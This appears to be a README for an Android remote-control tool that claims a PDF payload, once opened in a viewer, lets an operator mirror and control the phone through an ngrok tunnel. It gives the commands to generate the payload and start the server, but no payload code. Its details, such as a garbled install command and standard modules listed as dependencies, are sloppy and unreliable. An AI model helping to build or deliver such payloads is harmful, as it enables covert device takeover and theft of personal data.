# Shield-Android-RDP

This is a Python script that can be used to remotely control an Android device using a PDF payload.

## How to use

1. Install the required dependencies:
    * `ngrok`
    * `socket`
    * `struct`
    * `time`
    * `numpy`
    * `adbutils`
    * `av`
    * `Shield-Android-RDP`
0R just type
"pip3 install requirents.txt"

2. Get the PDF payload for your Android device. You can do this using the following command:
    ```
    python Shield.py generate_pdf_payload
    ```

3. Start ngrok and get the public URL.
4. Run the following command to start the Shield server:
    ```
    python Shield.py start --pdf-payload <PDF_PAYLOAD>
    

5. On your Android device, open the PDF payload in any PDF viewer.
6. Once the PDF payload is opened, the Shield server will start mirroring the Android device's screen.

## Git repository

The Git repository for this project is located at:


https://github.com/CIPHER0930/Shield-Android-RDP


## File to run

The file to run is called `Shield.py`.

## Caution

This script can be used to remotely control an Android device. This could allow an attacker to steal data, install malware, or even take complete control of the device. Use this script with caution and only on devices that you trust.



###################################
###################################
